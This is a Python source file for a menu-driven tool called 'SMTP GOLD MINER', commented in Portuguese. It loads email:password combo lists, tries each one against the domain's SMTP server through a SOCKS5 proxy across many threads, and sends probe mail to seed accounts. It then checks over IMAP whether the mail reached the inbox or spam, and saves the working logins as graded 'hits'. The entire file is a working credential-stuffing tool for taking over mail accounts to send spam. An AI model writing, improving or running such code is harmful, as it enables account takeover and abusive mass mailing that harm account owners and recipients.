import smtplib
import ssl
import threading
import dns.resolver
import imaplib
import sqlite3
import time
import socket
import socks
import json
import os
from queue import Queue
from datetime import datetime

# --- CORES PARA INTERFACE ---
G, R, Y, B, RESET = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[0m'

class SMTPGoldMiner:
    def __init__(self):
        self.db_path = 'gold_miner.db'
        self.config_file = 'config.json'
        self.load_config()
        self.setup_db()
        self.queue = Queue()

    def load_config(self):
        """Carrega configurações de arquivo externo para facilitar ajustes"""
        default_config = {"proxy_url": "", "threads": 50, "timeout": 15}
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = default_config
            with open(self.config_file, 'w') as f:
                json.dump(default_config, f, indent=4)

    def setup_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS combos (id INTEGER PRIMARY KEY, email TEXT, password TEXT, status TEXT DEFAULT 'pending')''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS seeds (id INTEGER PRIMARY KEY, email TEXT, password TEXT, imap_server TEXT)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS hits (id INTEGER PRIMARY KEY, host TEXT, port INTEGER, email TEXT, password TEXT, quality TEXT)''')
        conn.commit()
        conn.close()

    def log_error(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open('debug_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")

    def add_combos(self):
        print(f"\n{B}[+] Importando Combos...{RESET}")
        path = input("Caminho do arquivo combos.txt (email:pass): ")
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                count = 0
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line: continue
                    parts = line.split(':')
                    if len(parts) >= 2:
                        cursor.execute("INSERT INTO combos (email, password) VALUES (?, ?)", (parts[0], parts[1]))
                        count += 1
            conn.commit()
            conn.close()
            print(f"{G}[!] {count} combos importados!{RESET}")
        except Exception as e:
            print(f"{R}[!] Erro: {e}{RESET}")

    def add_seeds(self):
        print(f"\n{B}[+] Configurando Seed List...{RESET}")
        email = input("Email da conta de teste: ")
        password = input("Senha da conta de teste: ")
        server = input("Servidor IMAP: ")
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO seeds (email, password, imap_server) VALUES (?, ?, ?)", (email, password, server))
        conn.commit()
        conn.close()
        print(f"{G}[!] Seed adicionada!{RESET}")

    def get_mx(self, domain):
        """Resolução de DNS LOCAL para evitar erros de protocolo do proxy"""
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            return str(answers[0].exchange).strip('.')
        except Exception:
            return None

    def check_inbox(self, seed_email, seed_pass, imap_server, target_smtp_host):
        try:
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(seed_email, seed_pass)
            mail.select("inbox")
            if mail.search(None, f'(FROM "{target_smtp_host}")')[1]: return "OURO"
            mail.select("spam")
            if mail.search(None, f'(FROM "{target_smtp_host}")')[1]: return "PRATA"
            return "LIXO"
        except Exception as e:
            self.log_error(f"Erro IMAP: {e}")
            return "ERRO"
        finally:
            try: mail.logout()
            except: pass

    def validate_smtp(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, email, password FROM combos WHERE status = 'pending'")
        for p in cursor.fetchall(): self.queue.put(p)
        conn.close()

        def worker():
            # Conexão de banco independente por thread para evitar 'Recursive use of cursors'
            thread_conn = sqlite3.connect(self.db_path, check_same_thread=False)
            thread_cursor = thread_conn.cursor()
            
            while not self.queue.empty():
                try:
                    cid, email, password = self.queue.get()
                    domain = email.split('@')[1]
                    host = self.get_mx(domain)
                    
                    if not host:
                        thread_cursor.execute("UPDATE combos SET status = 'failed' WHERE id = ?", (cid,))
                        thread_conn.commit()
                        self.queue.task_done()
                        continue

                    # Configuração de Proxy Dinâmica para a conexão TCP
                    if self.config.get("proxy_url"):
                        try:
                            auth, addr = self.config["proxy_url"].split('@')
                            user, pwd = auth.split(':')
                            p_host, p_port = addr.split(':')
                            
                            # Patch de Socket: Força a conexão TCP a passar pelo SOCKS5
                            # Mas o DNS já foi resolvido localmente no get_mx()
                            original_socket = socket.socket
                            socket.socket = socks.socksocket
                            socks.set_default_proxy(socks.SOCKS5, p_host, int(p_port), username=user, password=pwd)
                        except Exception as e:
                            self.log_error(f"Erro config proxy thread: {e}")

                    try:
                        for port in [587, 465, 25]:
                            try:
                                if port == 465:
                                    server = smtplib.SMTP_SSL(host, port, timeout=self.config["timeout"])
                                else:
                                    server = smtplib.SMTP(host, port, timeout=self.config["timeout"])
                                    if port == 587: server.starttls()
                                
                                server.login(email, password)
                                
                                thread_cursor.execute("SELECT email, password, imap_server FROM seeds")
                                seeds = thread_cursor.fetchall()
                                for s_email, s_pass, s_server in seeds:
                                    server.sendmail(email, s_email, "Subject: Teste\n\nValidando.")
                                    time.sleep(2)
                                    res = self.check_inbox(s_email, s_pass, s_server, host)
                                    if res != "LIXO":
                                        print(f"{G}[HIT] {email} | {host}:{port} | {res}{RESET}")
                                        thread_cursor.execute("INSERT INTO hits (host, port, email, password, quality) VALUES (?, ?, ?, ?, ?)", 
                                                              (host, port, email, password, res))
                                        thread_conn.commit()
                                        break
                                server.quit()
                                break
                            except: continue
                    finally:
                        socket.socket = original_socket # Restaura socket para evitar conflitos

                    thread_cursor.execute("UPDATE combos SET status = 'tested' WHERE id = ?", (cid,))
                    thread_conn.commit()
                except Exception as e:
                    self.log_error(f"Erro crítico worker: {e}")
                finally:
                    self.queue.task_done()
            thread_conn.close()

        for _ in range(self.config["threads"]):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
        self.queue.join()

    def menu(self):
        while True:
            print(f"\n{Y}=== SMTP GOLD MINER v1.3 ==={RESET}")
            print(f"{B}Proxy Atual: {self.config['proxy_url'] if self.config['proxy_url'] else 'Nenhum'}{RESET}")
            print("1. Abastecer Combos\n2. Configurar Seed List\n3. Alterar Config (Proxy/Threads)\n4. Iniciar Mineração\n5. Exportar Hits\n0. Sair")
            op = input(f"\n{B}Escolha: {RESET}")
            if op == '1': self.add_combos()
            elif op == '2': self.add_seeds()
            elif op == '3':
                self.config["proxy_url"] = input("Nova URL Proxy (user:pass@host:port): ")
                self.config["threads"] = int(input("Quantidade de Threads: "))
                with open(self.config_file, 'w') as f:
                    json.dump(self.config, f, indent=4)
                print(f"{G}[!] Configurações salvas!{RESET}")
            elif op == '4': self.validate_smtp()
            elif op == '5':
                conn = sqlite3.connect(self.db_path)
                hits = conn.execute("SELECT * FROM hits").fetchall()
                with open('gold_smtps.txt', 'w') as f:
                    for h in hits: f.write(f"{h[1]}:{h[2]}:{h[3]}:{h[4]} | Qualidade: {h[5]}\n")
                conn.close()
                print(f"{G}[!] Exportado para gold_smtps.txt{RESET}")
            elif op == '0': break

if __name__ == "__main__":
    miner = SMTPGoldMiner()
    miner.menu()
